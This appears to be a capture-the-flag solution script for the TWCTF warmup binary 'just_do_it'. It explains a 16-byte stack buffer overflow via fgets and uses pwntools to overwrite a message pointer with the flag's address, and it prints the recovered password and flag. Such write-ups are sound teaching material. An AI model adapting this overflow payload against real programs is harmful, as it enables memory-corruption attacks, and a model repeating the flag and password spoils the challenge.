#!/usr/bin/python3

'''
We could easily find the password with strings command or just by looking at Ghidra: P@SSW0RD
But entering the password does not solve the challange.

size of buffer is 16 bytes, fgets reads in 32 => potential BOF

from Ghidra decompiler, the program will use puts(*pointer) to print out a message
we need to overflow the char buffer (16 bytes), overwrite the FILE pointer, then overwrite the char pointer with the flag pointer that points to the flag.
fill up 16 bytes + another 4 bytes + next 4 bytes is the memory address of the pointer that points to the flag.

Flag: TWCTF{pwnable_warmup_I_did_it!}
'''
import pwn as p

def pwn():
    start = p.process('./just_do_it')
    # passwd = 'P@SSW0RD\x00'
    payload = b'A'*20 + p.p32(0x0804a080)
    start.sendline(payload)
    start.interactive()

if __name__ == "__main__":
    pwn()
